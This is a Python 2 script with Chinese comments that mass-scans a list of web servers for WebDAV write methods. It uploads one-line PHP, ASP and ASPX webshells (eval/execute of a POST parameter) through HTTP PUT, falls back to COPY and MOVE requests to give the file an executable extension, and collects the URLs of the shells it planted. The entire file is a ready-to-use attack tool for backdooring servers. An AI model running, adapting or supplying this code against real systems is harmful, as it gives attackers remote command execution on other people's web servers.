#encoding:utf-8

import socket
import random

trace_list = []
upload_txt_list = []
upload_shell_list = []

# HTTP报文
# 1、host(不带http)
http_trace = 'OPTIONS / HTTP/1.1\r\nHost: %s\r\nConnection: Keep-alive\r\nAccept: text/plain\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5\r\n\r\n'
# 1、dir(例：/test.php) 2、Content-Length 3、Host 4、文件内容
http_put   = 'PUT %s HTTP/1.1\r\nContent-Length: %s\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\r\nHost: %s\r\n\r\n%s\r\n'
# 1、dir(例：/test.php) 2、Destination(例： http://127.0.0.1/test.asp) 3、Host
http_move  = 'MOVE %s HTTP/1.1\r\nDestination: %s\r\nHost: %s\r\n\r\n'
http_copy  = 'COPY %s HTTP/1.1\r\nDestination: %s\r\nHost: %s\r\nOverwrite: T\r\n\r\n'

# 一句话木马
php_virus  = '<?php @eval($_POST[value]);?>'
asp_virus  = '<%execute(request("value"))%>'
aspx_virus = '<%@ Page Language="Jscript"%><%eval(Request.Item["value"])%>'


def send_http(url, port, http_packet):
    try:
        sock.send(http_packet)
        return sock.recv(4096)
    except Exception, e:
        print 'socket send error: %s' % e


def controller(url, port, lang):
    global trace_list

    data = send_http(url, port, http_trace % (url+':'+port))
    if find_line(data, 'Allow'):
        print "[Trace] %s" % url
        trace_list.append(url)

        rand = random.randint(1, 500000)
        txt_res = send_http(url, port, http_put % ('/'+str(rand)+'.txt', len(eval(lang+'_virus')), url+':'+port, eval(lang+'_virus')))
        if ("201" or "204") in find_line(txt_res):
            print "[Upload TXT - PUT] %s" % '/'+str(rand)+'.txt'
            shell_res = send_http(url, port, http_put % ('/'+str(rand)+'.'+lang, len(eval(lang+'_virus')), url+':'+port, eval(lang+'_virus')))

            if ("201" or "204") in find_line(shell_res):
                print "[Upload SHELL - PUT] %s" % '/'+str(rand)+'.'+lang
                upload_shell_list.append(url+':'+port+'/'+str(rand)+'.'+lang)
            else:
                print "PUT SHELL fail, Error Code：" + find_line(shell_res)

                print "尝试COPY、MOVE方式上传..."
                dir = raw_input('请输入网站任意子目录，如存在http://test.com/test/index.html，则输入/test/: ')
                txt_res = send_http(url, port, http_put % ('/'+str(rand)+'.txt', len(eval(lang+'_virus')), url+':'+port, eval(lang+'_virus')))
                shell_copy_res = send_http(url, port, http_copy % ('/'+str(rand)+'.txt', 'http://'+url+':'+port+dir+str(rand)+'.'+lang, url+':'+port))
                if ("201" or "204") in find_line(shell_copy_res):
                    print "[Upload SHELL - COPY] %s" % '/'+str(rand)+'.'+lang
                    upload_shell_list.append(url+':'+port+dir+str(rand)+'.'+lang)
                    exit()
                else:
                    print "COPY Shell Fail, Error Code: "+find_line(shell_copy_res)

                txt_res = send_http(url, port, http_put % ('/'+str(rand)+'.txt', len(eval(lang+'_virus')), url+':'+port, eval(lang+'_virus')))
                shell_move_res = send_http(url, port, http_move % ('/'+str(rand)+'.txt', 'http://'+url+':'+port+dir+str(rand)+'.'+lang, url+':'+port))
                if ("201" or "204") in find_line(shell_move_res):
                    print "[Upload SHELL - MOVE] %s" % '/'+str(rand)+'.'+lang
                    upload_shell_list.append(url+':'+port+dir+str(rand)+'.'+lang)
                    exit()
                else:
                    print "MOVE Shell Fail, Error Code: "+find_line(shell_move_res)
        else:
            print "PUT TXT fail, Error Code：" + find_line(txt_res)



def find_line(http, line='1'):
    for tr in http.split('\r\n'):
        if line == '1':
            return tr
        else:
            if line in tr:
                return tr

    return

if __name__ == "__main__":
    file_object = open(raw_input("please input the file name: "))
    try:
        count = 1
        for line in file_object:
            temp = line.rsplit('\n')[0].split(' ')
            print "Testing No.%d: %s" % (count, temp[0])
            count += 1
            if len(temp) == 3:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    sock.connect((temp[0], int(temp[1])))
                except Exception, e:
                    print "socket connnect error: %s" % e
                    continue
                controller(temp[0], temp[1], temp[2])
                sock.close()
    finally:
        file_object.close()

    print "TRACE地址： %s" % trace_list
    print "SHELL地址： %s" % upload_shell_list